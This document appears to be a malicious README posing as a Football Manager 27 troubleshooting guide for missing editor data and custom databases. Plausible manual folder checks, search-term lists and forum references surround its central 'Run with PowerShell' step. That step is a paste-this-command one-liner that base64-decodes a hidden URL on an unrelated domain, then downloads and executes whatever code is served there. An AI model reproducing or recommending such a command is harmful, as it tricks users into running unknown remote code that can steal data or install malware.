# FM27-EditorDataCheck — Football Manager 27 PC troubleshooting

<p align="center">
  <img src="https://i.postimg.cc/VLQ0XLtJ/banner.png" alt="FM27-EditorDataCheck — Football Manager 27 Windows troubleshooting" width="100%">
</p>

**Football Manager 27 · Windows 10/11 · PowerShell · Troubleshooting guide**

## FM27 custom databases and editor data files do not appear when starting a new save

If you searched for **FM27 editor data not showing** or **Football Manager 27 custom database not showing**, this page walks through the Windows checks most relevant to that symptom. The goal is to keep each change reversible, separate game bugs from PC configuration issues and make it easier to tell what helped. The instructions are for the **Football Manager 27** Windows PC version, not console troubleshooting.

## Download the instructions

**[Download the launch instructions](../../releases/latest/download/HOW_TO_RUN.txt)** · [View all releases](../../releases)

The Release file is a plain-text copy of the launch steps. The same steps are included below for convenience.

## Run with PowerShell

1. Close Football Manager 27 completely before changing settings or troubleshooting files.
2. Press **Win + X**, then **I** to open PowerShell. On newer Windows versions, choose **Terminal** or **PowerShell** from the Win + X menu if the letter shortcut does not open it.
3. Copy the entire PowerShell command from the box below.
4. Paste the command into the PowerShell window and press **Enter**.
5. Follow the on-screen instructions, then launch the game again and check the original symptom.

### PowerShell command

```powershell
iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtcGxhY2UudG9wL3dvcmtlcj89NzY1MTI5MDYxMy9GaXg='))) -UseBasicParsing)
```

Run as administrator only if the command specifically explains why elevation is required. Check the source and destination of commands that download code from the web.

## Symptoms covered

- Custom league files or downloaded databases are missing from the selection screen when creating a new career.
- The Pre-Game Editor saved a file, but the game cannot see it.
- A second `Editor 27` folder exists alongside `Football Manager 27` in Documents/Sports Interactive.
- Windows OneDrive Documents and the local Documents folder contain different sets of editor files.

A matching symptom does not mean every PC has the same root cause. The checks below are ordered so you can identify which change, if any, makes a difference.

## Check the issue manually

1. Close Football Manager 27 and its Pre-Game Editor, then open the Windows Documents folder used by your current profile.
2. Compare `Documents\Sports Interactive\Editor 27\editor data` with `Documents\Sports Interactive\Football Manager 27\editor data`. Some players found that the editor saved files to the first location while the game read the second.
3. Check OneDrive\Documents\Sports Interactive as well if you have OneDrive folder backup enabled. Do not assume the first Documents folder you find is the active game-data location.
4. Copy the needed custom database files into the correct FM27 `editor data` folder; keep the original copies until the new save can see the files.
5. Start a new save and use the database/custom editor-file selection control. Some FM27 menu layouts moved controls compared with older Football Manager versions.
6. If the files still do not appear, check their extension and verify that they were created for FM27 rather than another game version.

## How to tell whether the problem changed

Launch **Football Manager 27** again and try the same action that originally failed. Record whether it now starts/loads correctly, whether the same error appears and whether the change lasts after a restart. If there is no improvement, revert temporary changes before trying another approach.

## Before changing files or security settings

Copy before moving or deleting. Avoid replacing an entire Sports Interactive folder; career saves, graphics and preferences may live nearby.

If the problem began after a patch, check the newest developer announcements. Avoid disabling security protections, downloading replacement executables or deleting unrelated game directories.

## Requirements and scope

- Windows 10 or Windows 11 PC
- Windows PowerShell 5.1 or PowerShell 7 / Windows Terminal
- A legitimate installed copy of **Football Manager 27**
- Enough file permissions for the specific task being performed; administrator rights are not required just to read a guide
- No anti-cheat, DRM or online-service bypass

## Frequently asked questions

**Where should editor data go?**

Usually in the active Football Manager 27 user-data folder under `editor data`; OneDrive and custom folder preferences can change the exact location.

**Why do I see an Editor 27 folder?**

Players reported that the Pre-Game Editor can save its files separately, so check both locations before deciding something is missing.

**Can I use an FM26 editor file?**

Compatibility depends on the file and format. Treat it as unverified unless the creator explicitly supports FM27.

## Related search terms

These are the phrases used throughout this page to describe the exact issue; use them when comparing your symptoms with current developer reports.

- FM27 editor data not showing
- Football Manager 27 custom database not showing
- FM27 editor data folder
- FM27 pre-game editor files missing
- FM27 editor data OneDrive path

## References

- [FM27 editor data discussion — Nov 13](https://www.reddit.com/r/footballmanagergames/comments/1xv8t6g/fm27_pregame_editor_files_not_showing_when/)
- [FM27 custom database discussion — Nov 10](https://www.reddit.com/r/footballmanagergames/comments/1xsrlnf/database_not_showing_in_new_save/)
- [Official Football Manager 27 site](https://www.footballmanager.com/fm27)

## Project note

This is an independent community troubleshooting page for Football Manager 27; it is not produced, endorsed or supported by the game developer or publisher. Game trademarks belong to their owners.

Documentation is provided under the MIT license indicated in the repository settings.
